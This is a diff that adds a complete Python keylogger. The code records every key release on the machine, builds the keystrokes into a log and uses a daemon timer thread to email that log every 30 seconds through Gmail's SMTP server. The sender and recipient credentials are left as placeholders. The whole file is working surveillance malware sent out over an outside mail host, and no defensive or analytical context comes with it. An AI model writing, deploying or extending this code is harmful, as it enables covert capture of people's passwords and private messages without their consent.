@@ -1,0 +1,90 @@
+#keyboard control module 
+import keyboard 
+#Simple Mail Transfer Protocol (SMTP) handles sending e-mail and routing e-mail between mail servers
+import smtplib 
+
+#for now, we will send keylogged data to some email 
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from threading import Timer 
+from datetime import datetime 
+
+#seconds 
+REPORT_FREQUENCY = 30
+#only gmail can be used so far, based on SMTP server 
+EMAIL_ADDRESS = "..."
+#need to generate app password for gmail, https://stackoverflow.com/questions/16512592/login-credentials-not-working-with-gmail-smtp 
+EMAIL_PASSWORD = "..."
+
+class Keylogger: 
+    def __init__(self, report_frequency, report_style="email"): 
+        self.report_frequency = report_frequency 
+        self.report_style = report_style
+        #string to store keystrokes 
+        self.log = ""
+        self.start_time = datetime.now() 
+        self.end_time = datetime.now() 
+
+    def key_log(self, event): 
+        name = event.name
+        #key cases
+        if len(name) > 1: 
+            if name == "space": 
+                name = " " 
+            elif name == "enter": 
+                name = "[ENTER]\n"
+            elif name == "decimal": 
+                name = "." 
+            else: 
+                name = name
+        self.log += name 
+    
+    def email(self,message):
+        #SMTP server connection
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        #connect
+        server.starttls()
+        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+
+
+        # Create a multipart message
+        msg = MIMEMultipart()
+        msg['From'] = EMAIL_ADDRESS
+        msg['To'] = EMAIL_ADDRESS
+        msg['Subject'] = "keylog info"
+        msg.attach(MIMEText(message, "plain"))
+
+        server.send_message(msg)
+        server.quit()
+        print("data sent at" + str(datetime.now()))
+
+    def report_convention(self): 
+        #only send if there is any logged info 
+        if self.log: 
+            if self.report_style == "email":
+                self.email(self.log)
+            
+        self.log = ""
+        #run the report_convention function based on report_frequency 
+        timer = Timer(interval = self.report_frequency, function = self.report_convention)
+        #set as Daemon thread 
+        timer.daemon = True; 
+        timer.start()
+
+    def start(self): 
+        keyboard.on_release(callback = self.key_log)
+        #after key is pressed, start timer on separate thread and 
+        self.report_convention()
+        #pauses programs, allows us to kill keylogger 
+        keyboard.wait()
+
+
+
+if __name__ == "__main__": 
+    #email sending convention 
+    keylogger = Keylogger(report_frequency=REPORT_FREQUENCY)
+    keylogger.start()
+
+
+
+
